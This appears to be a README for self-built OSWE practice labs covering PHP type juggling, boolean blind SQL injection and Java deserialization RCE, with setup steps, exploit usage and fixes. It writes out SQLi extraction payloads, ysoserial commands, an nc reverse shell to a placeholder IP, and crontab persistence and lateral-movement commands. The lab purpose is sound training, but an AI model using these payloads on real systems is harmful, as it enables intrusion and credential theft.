# OSWE_LAB_PREP_CUSTOM_LABS_BUILT_TO_ACE_OSWE_EXAM
OSWE CUSTOM LABS AND PREPARATION MASTER GUIDE

## Important Note: If you want docker images:

### Find here:
[php-type-juggling](https://hub.docker.com/repository/docker/aravindaakumar/oswe-single-lab/general)

[blind-sqli](https://hub.docker.com/repository/docker/aravindaakumar/oswe-sqli-lab/general)

[java-deserialization-lab](https://hub.docker.com/repository/docker/aravindaakumar/oswe-deserialization-lab/general)

# Topic: php type juggling custom lab for OSWE
# 🐧 LAMPP (Linux)

1. **Start LAMPP**

   ```bash
   sudo /opt/lampp/lampp start
   ```
# 🐧 LAMPP GUI Method

## **Start with GUI:**
```bash
cd /opt/lampp
sudo ./manager-linux-x64.run
```

## **What it does:**
- Opens visual control panel
- Shows service status (Apache, MySQL)
- Click buttons to start/stop services

## **After starting:**
- Website: `http://localhost`
- phpMyAdmin: `http://localhost/phpmyadmin`
- Files go in: `/opt/lampp/htdocs/`

## **To stop:**
- Click "Stop" in GUI
- Or terminal: `sudo /opt/lampp/lampp stop`

**Easier than command line, same result.**

2. **Copy PHP Files**

   * Place your `.php` files into the LAMPP web directory:

     ```bash
     cd OSWE_LAB_PREP/php_type_juggling/lab
     sudo cp -r . /opt/lampp/htdocs/.
     ```
   * Access them at:
     👉 `http://localhost/vulnerable_login.php`

3. **Import Database via phpMyAdmin**

   * Open: 👉 [http://localhost/phpmyadmin/](http://localhost/phpmyadmin/)
   * Click **Databases** → Create new DB .
   * Select  **Import** tab.
   * Browse and upload `database.sql`.
   * Click **Go** → schema + data imported.

4. **Update PHP Config**
   Inside your PHP connection file (e.g., `config.php`):

```php
   // Database configuration
  define('DB_HOST', 'localhost');
  define('DB_USER', 'root');
  define('DB_PASS', '');
  define('DB_NAME', 'type_juggling_lab');
```

go to the folder where there is php.py and run python3 php.py http://localhost/vulnerable_login.php change the payload in return to the magic hash password you want 
```bash

def php_magic_hashes():
	print("[+] Returning php magic hashes whose md5 evaluate to 0")
	return "aabg7XSs"
```
# 📝 SQL Injection Lab Setup Guide for OSWE

## 🎯 Topic: Blind SQL Injection (Boolean-Based) Lab

## 🐧 XAMPP/LAMPP Setup

### 1. **Start XAMPP/LAMPP Server**
```bash
sudo /opt/lampp/lampp start
```
# 🐧 LAMPP GUI Method

## **Start with GUI:**
```bash
cd /opt/lampp
sudo ./manager-linux-x64.run
```

## **What it does:**
- Opens visual control panel
- Shows service status (Apache, MySQL)
- Click buttons to start/stop services

## **After starting:**
- Website: `http://localhost`
- phpMyAdmin: `http://localhost/phpmyadmin`
- Files go in: `/opt/lampp/htdocs/`

## **To stop:**
- Click "Stop" in GUI
- Or terminal: `sudo /opt/lampp/lampp stop`

**Easier than command line, same result.**

### 2. **Import Database**
#### **Method A: Using phpMyAdmin**
1. Open phpMyAdmin: 👉 [http://localhost/phpmyadmin/](http://localhost/phpmyadmin/)
2. Click **Databases** → Create new database named `oswe_lab`
3. Select the new database, go to **Import** tab
4. Browse and upload `setup.sql`
5. Click **Go** to execute

### 3. **Deploy Web Application**
```bash
# Copy PHP files to web directory
cp config.php index.php /opt/lampp/htdocs/
```

**Access the vulnerable application:** 👉 `http://localhost/index.php`

## 🗂️ File Structure
```
sql-injection-lab/
├── setup.sql           # Database schema and data
├── config.php          # Database configuration
├── index.php           # Vulnerable web application
└── sqli.py             # Exploitation script
```

## 📊 Database Details

### **Tables Created:**
1. **`products`** (Visible table)
   - id, name, description, price
   - Contains: OSWE Course Guide, Debugging Tool, etc.

2. **`users`** (Hidden target table)
   - id, username, password, is_admin
   - Contains: admin user with flag as password

### **Database Credentials:**
```php
Username: oswe_user
Password: oswe_password
Database: oswe_lab
```

## 🎯 Vulnerability Analysis

### **Location:**
```php
// In index.php line ~20:
$sql = "SELECT name, description, price FROM products WHERE id = ". $id. " LIMIT 1";
```

### **Type:**
- **Boolean-Based Blind SQL Injection**
- No direct output of query results
- Uses presence/absence of "OSWE Course Guide" as boolean oracle

## 🔧 Exploitation Script

### **`sqli.py` - Automated Exploitation**
This script automates the extraction of the admin password using blind SQL injection.

### **Usage:**
```bash
cd ~/OSWE/sqli
python3 sqli.py http://localhost/index.php
```

### **What the Script Does:**
1. **Determines password length** by testing LENGTH() conditions
2. **Extracts password character by character** using SUBSTRING() and ASCII() comparisons
3. **Uses "OSWE Course Guide"** in response as a boolean indicator
4. **Reconstructs the flag** from extracted characters

### **Character Set:**
```python
charset = string.ascii_letters + string.digits + "{}_-@!?"
# Covers typical flag formats like: OSWE{Blind_SQLi_XAMPP_Mastery_2025}
```

## 🚀 Running the Exploit

### **Step-by-Step Execution:**
```bash
# Navigate to script directory
cd ~/OSWE/sqli

# Run the exploit
python3 sqli.py http://localhost/index.php
```

### **Expected Output:**
```
[+] http://localhost/index.php is our target
[+] Length of the password is 34
OSWE{Blind_SQLi_XAMPP_Mastery_2025}
[+] Password is OSWE{Blind_SQLi_XAMPP_Mastery_2025}
[!] Done :)
```

## 🔍 Manual Testing Payloads

### **1. Test for Vulnerability:**
```
http://localhost/index.php?id=1 AND 1=1  -- Shows product
http://localhost/index.php?id=1 AND 1=2  -- No product (page shows error)
```

### **2. Determine Password Length:**
```
http://localhost/index.php?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin'))=34
```

### **3. Extract First Character:**
```
http://localhost/index.php?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=79
# 79 = 'O' in ASCII
```

### **4. Extract Entire Password (Manual):**
```
http://localhost/index.php?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=79 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1))=83 AND ...
```

## 🧠 Understanding the Exploit

### **Boolean-Based Logic:**
- **TRUE Condition:** Product with ID=1 exists → Shows "OSWE Course Guide"
- **FALSE Condition:** No product returned → Shows "Product not found"

### **Payload Breakdown:**
```sql
1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=79
```
- `1` - Valid product ID that exists
- `AND` - Logical operator to add our condition
- `ASCII(SUBSTRING(...))` - Gets ASCII value of character at position
- `=79` - Compares to ASCII value of 'O'

### **The Flag:**
The admin password is the flag: **`OSWE{Blind_SQLi_XAMPP_Mastery_2025}`**

## 🛡️ Defense Mechanisms

### **How to Fix the Vulnerability:**

1. **Use Prepared Statements:**
```php
$stmt = $conn->prepare("SELECT name, description, price FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

2. **Input Validation:**
```php
if (!is_numeric($id) || $id <= 0) {
    die("Invalid product ID");
}
```

3. **Use Parameterized Queries:**
```php
$sql = "SELECT name, description, price FROM products WHERE id = :id";
$stmt = $pdo->prepare($sql);
$stmt->execute(['id' => $id]);
```

4. **Least Privilege Principle:**
   - Already implemented: Using `oswe_user` with limited privileges
   - Avoid using root database accounts

## 📚 Learning Objectives

✅ Understand Boolean-based blind SQL injection  
✅ Learn to exploit SQLi without direct output  
✅ Practice writing automated exploitation scripts  
✅ Understand database enumeration techniques  
✅ Learn about MySQL SUBSTRING() and ASCII() functions  
✅ Practice character-by-character data extraction  

## 🐛 Troubleshooting

### **Common Issues:**
1. **Database connection fails:**
   - Check if MySQL is running: `sudo /opt/lampp/lampp status`
   - Verify credentials in `config.php`

2. **Exploit script doesn't find length:**
   - Check if "OSWE Course Guide" exists in response
   - Test manually with payloads first

3. **Character set incomplete:**
   - Modify charset in script if flag contains special characters

## 📖 Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Academy](https://portswigger.net/web-security/sql-injection)
- [MySQL String Functions Documentation](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html)

## ⚠️ Legal & Ethical Notice

This lab is for **educational purposes only**. Use only in controlled environments with proper authorization. Never test on systems you don't own or have explicit permission to test.

---

**Happy hacking and learning SQL Injection! 🔍💻**


# Topic : Java Deserialization RCE Lab

## 📋 Overview
A deliberately vulnerable Java web application demonstrating insecure deserialization attacks leading to Remote Code Execution (RCE). This lab showcases the classic Java deserialization vulnerability using Apache Commons Collections 3.1, similar to the vulnerability that affected many enterprise applications.

## ⚠️ Warning
**FOR EDUCATIONAL PURPOSES ONLY**  
This lab contains intentionally vulnerable code. Do not deploy in production environments or expose to untrusted networks.

## 🎯 Learning Objectives
- Understand Java serialization/deserialization mechanisms
- Learn about gadget chains in deserialization attacks
- Practice exploiting insecure deserialization vulnerabilities
- Develop and test payloads using ysoserial
- Implement proper input validation and secure deserialization practices

## 🏗️ Architecture
The lab consists of a simple Java Servlet that accepts serialized Java objects via HTTP POST and deserializes them without validation. The application uses Apache Commons Collections 3.1, which contains dangerous transformer chains that can be exploited for RCE.

### Vulnerable Component: `VulnerableServlet.java`
```java
// Critical vulnerability in doPost() method:
ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
Object object = objectInputStream.readObject(); // UNSAFE DESERIALIZATION
```

## 📁 Project Structure
```
deserlab/
├── src/main/java/com/example/VulnerableServlet.java
├── src/main/webapp/WEB-INF/web.xml
└── pom.xml
```

## 🚀 Setup & Installation

### Prerequisites
- Java 8 JDK
- Apache Maven 3.6+
- Python 3.8+ (for exploit scripts)

### Building the Application
```bash
cd deserlab
mvn clean package
```

### Running the Vulnerable Server
```bash
# Start the Jetty embedded server
mvn jetty:run

# Application will be available at:
# http://localhost:8080/api/v1/ingest
```

## 🔍 Vulnerability Details

### The Flaw
The servlet's `doPost()` method blindly deserializes any Java object sent in the HTTP request body. When combined with Apache Commons Collections 3.1's transformer chains, this allows attackers to construct malicious serialized objects that execute arbitrary commands during deserialization.

### Technical Details
- **Vulnerable Method**: `ObjectInputStream.readObject()`
- **Dangerous Library**: Apache Commons Collections 3.1
- **Gadget Chains**: CommonsCollections1, CommonsCollections5, etc.
- **Attack Vector**: HTTP POST with serialized Java object in body
- **Impact**: Remote Code Execution as the server user

## ⚔️ Exploitation

### Tools Required
- [ysoserial](https://github.com/frohoff/ysoserial) - Payload generation tool
- Netcat - For reverse shell connections
- Python with requests library

### Basic Exploitation Steps

1. **Start the vulnerable server:**
   ```bash
   cd deserlab
   mvn jetty:run
   ```

2. **Generate a malicious payload:**
   ```bash
   java -jar ysoserial.jar CommonsCollections5 "touch /tmp/pwned" > payload.bin
   ```

3. **Send the exploit:**
   ```bash
   curl -X POST http://localhost:8080/api/v1/ingest \
        --data-binary @payload.bin \
        -H "Content-Type: application/octet-stream"
   ```

### Reverse Shell Exploitation

1. **Start a listener:**
   ```bash
   nc -nlvp 9003
   ```

2. **Generate and send reverse shell payload:**
   ```bash
   java -jar ysoserial.jar CommonsCollections5 "nc -e /bin/bash YOUR_IP 9003" > revshell.bin
   
   curl -X POST http://localhost:8080/api/v1/ingest \
        --data-binary @revshell.bin \
        -H "Content-Type: application/octet-stream"
   ```

3. **Or use the provided Python exploit script:**
   ```bash
   python3 deserialize.py http://localhost:8080/api/v1/ingest YOUR_IP 9003
   ```

## 🛡️ Mitigation Strategies

### Immediate Fixes
1. **Use Safe Alternatives:**
   - Implement look-ahead deserialization
   - Use `ObjectInputFilter` (Java 9+)
   - Validate serialized objects before deserialization

2. **Library Updates:**
   - Upgrade to Apache Commons Collections 4.0+
   - Apply security patches

3. **Input Validation:**
   - Implement allow-list for expected classes
   - Use signed serialized objects

### Secure Coding Practices
- Never deserialize untrusted data
- Use alternative data formats (JSON, XML, Protobuf)
- Implement proper class filtering
- Use the principle of least privilege for server execution

## 🧪 Testing Different Gadget Chains

The lab supports multiple gadget chains. Test which ones work with:

```bash
# Test various chains
for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7; do
    echo "Testing $chain..."
    java -jar ysoserial.jar $chain "touch /tmp/test_$chain" > payload.bin
    curl -X POST http://localhost:8080/api/v1/ingest --data-binary @payload.bin -H "Content-Type: application/octet-stream"
done
```

## 📊 Impact Assessment

| Aspect | Impact Level |
|--------|--------------|
| Confidentiality | High - Can read arbitrary files |
| Integrity | High - Can modify/delete files |
| Availability | Medium - Can crash the server |
| Privilege Escalation | Depends on server user privileges |

## 🔧 Advanced Exploitation Techniques

### Chained Exploits
1. **Information Gathering:**
   ```bash
   java -jar ysoserial.jar CommonsCollections5 "cat /etc/passwd" > info.bin
   ```

2. **Persistence:**
   ```bash
   java -jar ysoserial.jar CommonsCollections5 "echo 'malicious_cron' >> /etc/crontab" > persist.bin
   ```

3. **Lateral Movement:**
   ```bash
   java -jar ysoserial.jar CommonsCollections5 "ssh user@internal_host" > lateral.bin
   ```

### Bypass Techniques
- Obfuscating payloads
- Using alternative encoding
- Chaining multiple gadget chains
- Exploiting different library versions

## 🎓 Educational Value

This lab helps understand:
- The danger of blind deserialization
- How gadget chains work in Java
- The importance of input validation
- Real-world exploitation techniques
- Proper mitigation strategies

## 📚 References & Resources

### Further Reading
- [Oracle Secure Coding Guidelines for Java](https://www.oracle.com/java/technologies/javase/seccodeguide.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Apache Commons Collections Security](https://commons.apache.org/proper/commons-collections/security-reports.html)

### Related CVEs
- CVE-2015-4852 - Apache Commons Collections RCE
- CVE-2016-8735 - Java Deserialization RCE
- Multiple vendor-specific deserialization vulnerabilities

## 🤝 Contributing

Found an issue or have an improvement? Please open an issue or submit a pull request following the project's contribution guidelines.

## 📄 License

This project is licensed for educational use only. See LICENSE file for details.

## ⚠️ Disclaimer

This software is provided for educational purposes only. The authors are not responsible for any misuse or damage caused by this program. Use responsibly and only on systems you own or have permission to test.

---

**Remember:** Always practice ethical hacking. Only test systems you own or have explicit permission to test.
